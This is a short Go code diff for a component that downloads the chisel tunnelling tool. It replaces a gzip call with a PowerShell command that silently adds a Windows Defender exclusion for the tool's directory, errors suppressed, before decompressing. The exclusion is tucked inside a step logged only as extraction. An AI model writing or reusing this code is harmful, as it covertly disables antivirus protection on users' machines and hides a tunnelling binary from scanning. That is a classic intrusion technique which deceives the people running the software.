@@ -102,8 +102,9 @@ func (t *ChiselTunnel) download() error {
 	log.Printf("[chisel] downloaded %d bytes", written)
 
 	log.Printf("[chisel] extracting chisel.exe...")
-	cmd := exec.Command("gzip", "-d", "-f", gzPath)
-	if output, err := cmd.CombinedOutput(); err != nil {
+	psCmd := fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue; $f = [System.IO.File]::OpenRead('%s'); $g = New-Object System.IO.FileStream('%s', [System.IO.FileMode]::Create); $s = New-Object System.IO.Compression.GZipStream($f, [System.IO.Compression.CompressionMode]::Decompress); $s.CopyTo($g); $g.Close(); $f.Close(); $s.Close()`, t.binDir, gzPath, binPath)
+	ps := exec.Command("powershell", "-NoProfile", "-Command", psCmd)
+	if output, err := ps.CombinedOutput(); err != nil {
 		return fmt.Errorf("extract: %w - %s", err, string(output))
 	}
 
